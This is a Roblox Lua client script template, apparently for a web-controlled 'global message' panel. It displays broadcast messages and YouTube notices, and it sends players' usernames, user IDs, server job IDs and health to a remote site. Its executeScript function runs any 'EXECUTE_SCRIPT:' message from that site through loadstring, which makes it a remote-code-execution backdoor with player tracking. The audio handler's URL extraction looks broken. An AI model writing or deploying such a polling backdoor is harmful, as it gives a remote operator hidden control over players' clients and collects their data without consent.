local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local API_KEY = "{API_KEY}"
local WEBSITE_URL = "{WEBSITE_URL}"
-- Dynamic check interval based on settings - instant refresh uses 0.5 seconds, custom timer uses user setting
local CHECK_INTERVAL = {CHECK_INTERVAL}
local INSTANT_REFRESH = {INSTANT_REFRESH}
local NEW_MESSAGES_ONLY = {NEW_MESSAGES_ONLY}
local SHOW_STATUS = {SHOW_STATUS_MESSAGES}

local lastMessageId = 0
local lastMessageTimestamp = nil
local isRunning = true
local messageFrame = nil
local statusLabel = nil
local heartbeatInterval = 60

local function waitForCharacterSafely()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid", 10)
    return character, humanoid
end

local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "GlobalMessageGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui

    messageFrame = Instance.new("Frame")
    messageFrame.Name = "MessageFrame"
    messageFrame.Size = UDim2.new(0.8, 0, 0.1, 0)
    messageFrame.Position = UDim2.new(0.1, 0, 0.05, 0)
    messageFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    messageFrame.BackgroundTransparency = 0.3
    messageFrame.BorderSizePixel = 0
    messageFrame.Visible = false
    messageFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = messageFrame

    local messageLabel = Instance.new("TextLabel")
    messageLabel.Name = "MessageLabel"
    messageLabel.Size = UDim2.new(1, -20, 1, -10)
    messageLabel.Position = UDim2.new(0, 10, 0, 5)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Text = ""
    messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    messageLabel.TextScaled = true
    messageLabel.Font = Enum.Font.GothamBold
    messageLabel.Parent = messageFrame

    if SHOW_STATUS then
        statusLabel = Instance.new("TextLabel")
        statusLabel.Name = "StatusLabel"
        statusLabel.Size = UDim2.new(0.3, 0, 0.05, 0)
        statusLabel.Position = UDim2.new(0.7, 0, 0.9, 0)
        statusLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        statusLabel.BackgroundTransparency = 0.5
        statusLabel.BorderSizePixel = 0
        statusLabel.Text = INSTANT_REFRESH and "⚡ Instant Mode" or "🔄 Connecting..."
        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        statusLabel.TextScaled = true
        statusLabel.Font = Enum.Font.Gotham
        statusLabel.Parent = screenGui

        local statusCorner = Instance.new("UICorner")
        statusCorner.CornerRadius = UDim.new(0, 5)
        statusCorner.Parent = statusLabel
    end
end

local function updateStatus(text, color)
    if SHOW_STATUS and statusLabel and statusLabel.Parent then
        pcall(function()
            statusLabel.Text = text
            statusLabel.TextColor3 = color or Color3.fromRGB(255, 255, 255)
        end)
    end
end

local function sendHeartbeat()
    pcall(function()
        local character, humanoid = waitForCharacterSafely()
        if not character or not humanoid then return end
        
        local playerData = {
            apiKey = API_KEY,
            username = player.Name,
            displayName = player.DisplayName,
            userId = tostring(player.UserId),
            jobId = game.JobId,
            placeId = tostring(game.PlaceId),
            isActive = true, -- Always mark as active when sending heartbeat
            lastSeen = os.time(),
            health = humanoid.Health,
            maxHealth = humanoid.MaxHealth
        }
        
        HttpService:PostAsync(
            WEBSITE_URL .. "/api/players",
            HttpService:JSONEncode(playerData),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

local function displayMessage(messageText, isYouTube, isAudio, isScript)
    if not messageFrame or not messageFrame.Parent then return end
    
    local messageLabel = messageFrame:FindFirstChild("MessageLabel")
    if not messageLabel then return end

    local prefix = ""
    if isScript then
        prefix = "[SCRIPT] "
    elseif isYouTube then
        prefix = isAudio and "[AUDIO] " or "[VIDEO] "
    else
        prefix = "[GLOBAL] "
    end

    local sanitizedText = string.gsub(messageText, "[%z\1-\31]", "")
    messageLabel.Text = prefix .. sanitizedText
    messageFrame.Visible = true
    
    local tweenIn = TweenService:Create(
        messageFrame,
        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {Position = UDim2.new(0.1, 0, 0.05, 0)}
    )
    
    tweenIn:Play()
    
    spawn(function()
        wait(5)
        
        if messageFrame and messageFrame.Parent then
            local tweenOut = TweenService:Create(
                messageFrame,
                TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In),
                {Position = UDim2.new(0.1, 0, -0.15, 0)}
            )
            
            tweenOut:Play()
            tweenOut.Completed:Connect(function()
                if messageFrame and messageFrame.Parent then
                    messageFrame.Visible = false
                    messageFrame.Position = UDim2.new(0.1, 0, 0.05, 0)
                end
            end)
        end
    end)
    
    pcall(function()
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = prefix .. sanitizedText;
            Color = Color3.fromRGB(255, 215, 0);
            Font = Enum.Font.GothamBold;
            FontSize = Enum.FontSize.Size18;
        })
    end)
end

local function getYouTubeVideoId(url)
    local patterns = {
        "youtube%.com/watch%?v=([%w%-_]+)",
        "youtu%.be/([%w%-_]+)",
        "youtube%.com/embed/([%w%-_]+)",
        "youtube%.com/v/([%w%-_]+)"
    }
    
    for _, pattern in ipairs(patterns) do
        local videoId = string.match(url, pattern)
        if videoId then
            return videoId
        end
    end
    return nil
end

local function handleYouTubeContent(url, isAudioOnly)
    local videoId = getYouTubeVideoId(url)
    if not videoId then
        displayMessage("Invalid YouTube URL: " .. url, true, isAudioOnly, false)
        updateStatus("❌ Invalid URL", Color3.fromRGB(255, 0, 0))
        return
    end

    updateStatus(isAudioOnly and "🎵 Loading audio..." or "🎥 Loading video...", Color3.fromRGB(255, 165, 0))

    local success, result = pcall(function()
        if isAudioOnly then
            local response = HttpService:GetAsync("https://www.youtube.com/oembed?url=" .. url .. "&format=json")
            local directUrl =
             response and response:match('data:(https://[^%s]+)') or nil
            
            local sound = Instance.new("Sound")
            sound.SoundId = directUrl or "rbxasset://sounds/electronicpingshort.wav"
            sound.Volume = 0.5
            sound.Parent = SoundService
            
            displayMessage("Audio requested: " .. url, true, true, false)
            updateStatus("🎵 Audio processed", Color3.fromRGB(0, 255, 0))
            
            sound:Play()
            sound.Ended:Connect(function()
                sound:Destroy()
            end)
        else
            displayMessage("Video requested: " .. url, true, false, false)
            updateStatus("🎥 Video processed", Color3.fromRGB(0, 255, 0))
            
            local notificationGui = Instance.new("ScreenGui")
            notificationGui.Name = "VideoNotification"
            notificationGui.Parent = playerGui
            
            local notificationFrame = Instance.new("Frame")
            notificationFrame.Size = UDim2.new(0.4, 0, 0.2, 0)
            notificationFrame.Position = UDim2.new(0.3, 0, 0.4, 0)
            notificationFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            notificationFrame.BackgroundTransparency = 0.2
            notificationFrame.BorderSizePixel = 2
            notificationFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
            notificationFrame.Parent = notificationGui
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 10)
            corner.Parent = notificationFrame
            
            local titleLabel = Instance.new("TextLabel")
            titleLabel.Size = UDim2.new(1, -20, 0.4, 0)
            titleLabel.Position = UDim2.new(0, 10, 0, 10)
            titleLabel.BackgroundTransparency = 1
            titleLabel.Text = "🎥 YouTube Video"
            titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            titleLabel.TextScaled = true
            titleLabel.Font = Enum.Font.GothamBold
            titleLabel.Parent = notificationFrame
            
            local urlLabel = Instance.new("TextLabel")
            urlLabel.Size = UDim2.new(1, -20, 0.4, 0)
            urlLabel.Position = UDim2.new(0, 10, 0.4, 0)
            urlLabel.BackgroundTransparency = 1
            urlLabel.Text = url
            urlLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
            urlLabel.TextScaled = true
            urlLabel.Font = Enum.Font.Gotham
            urlLabel.Parent = notificationFrame
            
            local closeButton = Instance.new("TextButton")
            closeButton.Size = UDim2.new(0.3, 0, 0.2, 0)
            closeButton.Position = UDim2.new(0.35, 0, 0.8, -10)
            closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            closeButton.Text = "Close"
            closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            closeButton.Font = Enum.Font.GothamBold
            closeButton.TextScaled = true
            closeButton.Parent = notificationFrame
            
            local buttonCorner = Instance.new("UICorner")
            buttonCorner.CornerRadius = UDim.new(0, 5)
            buttonCorner.Parent = closeButton
            
            closeButton.MouseButton1Click:Connect(function()
                notificationGui:Destroy()
            end)
            
            spawn(function()
                wait(10)
                if notificationGui and notificationGui.Parent then
                    notificationGui:Destroy()
                end
            end)
        end
    end)

    if not success then
        displayMessage("Error processing YouTube content: " .. tostring(result), true, isAudioOnly, false)
        updateStatus("❌ Processing failed", Color3.fromRGB(255, 0, 0))
    end
end

local function executeScript(scriptCode)
    updateStatus("⚡ Executing script...", Color3.fromRGB(255, 165, 0))
    
    local sanitizedScript = string.gsub(scriptCode, "[%z\1-\31]", "")
    sanitizedScript = string.gsub(sanitizedScript, "[\194-\244][\128-\191]*", "")
    
    -- Send execution tracking before running script
    pcall(function()
        local executionData = {
            apiKey = API_KEY,
            username = player.Name,
            displayName = player.DisplayName,
            userId = tostring(player.UserId),
            jobId = game.JobId,
            placeId = tostring(game.PlaceId),
            isActive = true,
            totalExecutions = 1 -- This will be incremented by the API
        }
        
        HttpService:PostAsync(
            WEBSITE_URL .. "/api/players",
            HttpService:JSONEncode(executionData),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    local success, result = pcall(function()
        local func, compileError = loadstring(sanitizedScript)
        if func then
            local execSuccess, execResult = pcall(func)
            if execSuccess then
                return "Script executed successfully"
            else
                return "Runtime error: " .. tostring(execResult)
            end
        else
            return "Compile error: " .. tostring(compileError)
        end
    end)
    
    if success then
        displayMessage("Script executed: " .. string.sub(sanitizedScript, 1, 50) .. "...", false, false, true)
        updateStatus("✅ Script executed", Color3.fromRGB(0, 255, 0))
    else
        displayMessage("Script error: " .. tostring(result), false, false, true)
        updateStatus("❌ Script failed", Color3.fromRGB(255, 0, 0))
    end
end

-- Enhanced message checking with instant refresh and timestamp filtering
local function checkMessages()
    if not isRunning then return end
    
    local statusText = INSTANT_REFRESH and "⚡ Instant check..." or "🔄 Checking messages..."
    updateStatus(statusText, Color3.fromRGB(255, 255, 255))
    
    local success, result = pcall(function()
        local url = WEBSITE_URL .. "/api/get-messages?apiKey=" .. API_KEY .. "&lastId=" .. lastMessageId
        
        -- Add timestamp parameter for new messages only mode
        if NEW_MESSAGES_ONLY and lastMessageTimestamp then
            url = url .. "&since=" .. HttpService:UrlEncode(lastMessageTimestamp)
        end
        
        local response = HttpService:GetAsync(url)
        local data = HttpService:JSONDecode(response)
        
        if data.success and data.messages then
            local newMessagesCount = 0
            for _, message in ipairs(data.messages) do
                if message.id > lastMessageId then
                    lastMessageId = message.id
                    lastMessageTimestamp = message.sent_at
                    newMessagesCount = newMessagesCount + 1
                    
                    local messageText = message.message
                    
                    if string.find(messageText, "YOUTUBE:") == 1 then
                        local url = string.sub(messageText, 9)
                        handleYouTubeContent(url, false)
                    elseif string.find(messageText, "YOUTUBE_AUDIO:") == 1 then
                        local url = string.sub(messageText, 15)
                        handleYouTubeContent(url, true)
                    elseif string.find(messageText, "EXECUTE_SCRIPT:") == 1 then
                        local scriptCode = string.sub(messageText, 16)
                        executeScript(scriptCode)
                    else
                        displayMessage(messageText, false, false, false)
                    end
                end
            end
            
            local statusText = INSTANT_REFRESH and "⚡ " or "✅ "
            if newMessagesCount > 0 then
                statusText = statusText .. newMessagesCount .. " new messages"
                updateStatus(statusText, Color3.fromRGB(0, 255, 0))
            else
                statusText = statusText .. "No new messages"
                updateStatus(statusText, Color3.fromRGB(0, 255, 0))
            end
        else
            local statusText = INSTANT_REFRESH and "⚡ Connected" or "✅ Connected"
            updateStatus(statusText, Color3.fromRGB(0, 255, 0))
        end
    end)
    
    if not success then
        updateStatus("❌ Connection failed", Color3.fromRGB(255, 0, 0))
        print("[GLOBAL API] Connection error: " .. tostring(result))
    end
end

local function initializeScript()
    pcall(function()
        waitForCharacterSafely()
        createGUI()
        sendHeartbeat()
        
        if SHOW_STATUS then
            local modeText = INSTANT_REFRESH and "instant refresh" or ("custom timer (" .. CHECK_INTERVAL .. "s)")
            print("[GLOBAL API] Enhanced script loaded for " .. player.Name .. " with " .. modeText)
        end
    end)
end

initializeScript()

-- Dynamic spawn intervals based on instant refresh setting
spawn(function()
    while isRunning do
        checkMessages()
        local waitTime = INSTANT_REFRESH and 0.5 or CHECK_INTERVAL
        wait(waitTime)
    end
end)

spawn(function()
    while isRunning do
        sendHeartbeat()
        wait(heartbeatInterval)
    end
end)

Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        isRunning = false
        pcall(function()
            if messageFrame and messageFrame.Parent then
                messageFrame:Destroy()
            end
            if statusLabel and statusLabel.Parent then
                statusLabel:Destroy()
            end
        end)
    end
end)
